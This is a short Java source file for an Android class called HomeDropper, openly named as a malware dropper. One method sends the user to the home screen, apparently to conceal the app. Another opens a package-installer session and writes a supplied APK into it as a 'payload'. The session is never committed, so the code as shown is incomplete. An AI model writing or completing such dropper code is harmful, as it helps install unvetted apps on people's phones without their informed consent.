package com.example.dropper;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import java.io.IOException;
import java.io.OutputStream;

public final class HomeDropper {
    public void arm(Context ctx) {
        Intent home = new Intent(Intent.ACTION_MAIN);
        home.addCategory(Intent.CATEGORY_HOME);
        ctx.startActivity(home);
    }

    public void install(Context ctx, byte[] apk) throws IOException {
        if (!ctx.getPackageManager().canRequestPackageInstalls()) {
            return;
        }
        PackageInstaller pi = ctx.getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams p =
            new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        int id = pi.createSession(p);
        PackageInstaller.Session s = pi.openSession(id);
        try (OutputStream out = s.openWrite("payload", 0, apk.length)) {
            out.write(apk);
        }
    }
}
